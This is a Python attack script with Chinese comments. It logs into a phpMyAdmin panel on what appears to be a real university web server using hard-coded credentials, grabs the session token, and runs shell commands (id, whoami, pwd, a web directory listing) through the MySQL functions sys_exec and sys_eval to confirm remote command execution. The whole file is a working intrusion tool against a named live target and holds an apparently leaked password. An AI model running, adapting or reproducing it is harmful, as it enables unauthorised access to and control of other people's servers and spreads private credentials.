#!/usr/bin/env python3
import requests
import re
import html
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text).group(1)

print(f"[+] Token: {token}")
print("[+] 验证成功：sys_exec可以执行命令!\n")

# 执行命令
commands = [
    ("id", "查看用户信息"),
    ("whoami", "查看当前用户"),
    ("pwd", "查看当前目录"),
    ("ls -la /var/www/html/enmeeting/", "查看enmeeting目录"),
]

for cmd, desc in commands:
    print(f"[*] {desc}: {cmd}")
    sql = f"SELECT sys_exec('{cmd}');"
    sql_data = {"sql_query": sql, "db": "mysql"}
    resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
    
    # 解析响应 - 查找命令输出
    content = resp.text
    
    # 查找包含命令输出的区域
    # sys_exec的返回值通常是返回码，但输出可能在错误日志或其他地方
    # 尝试查找可能的输出
    if "uid=" in content.lower() or "gid=" in content.lower():
        # 提取包含uid/gid的部分
        matches = re.findall(r'[^<>]*uid=.*?[^<>]*', content, re.IGNORECASE)
        for match in matches:
            clean = html.unescape(match)
            if "uid=" in clean.lower():
                print(f"[+] 输出: {clean[:200]}")
                break
    
    # 尝试sys_eval获取输出
    sql = f"SELECT sys_eval('{cmd}');"
    sql_data = {"sql_query": sql, "db": "mysql"}
    resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
    
    content = resp.text
    # 查找输出
    if "uid=" in content.lower() or "gid=" in content.lower() or desc in content.lower():
        # 提取文本内容
        text_content = re.sub(r'<[^>]+>', ' ', content)
        text_content = html.unescape(text_content)
        # 查找包含命令输出的行
        lines = text_content.split('\n')
        for line in lines:
            if "uid=" in line.lower() or "gid=" in line.lower() or (desc and desc[:5].lower() in line.lower()):
                print(f"[+] 输出: {line.strip()[:200]}")
                break

print("\n[+] 命令执行验证完成!")
print("[*] 可以使用sys_exec/sys_eval执行系统命令")
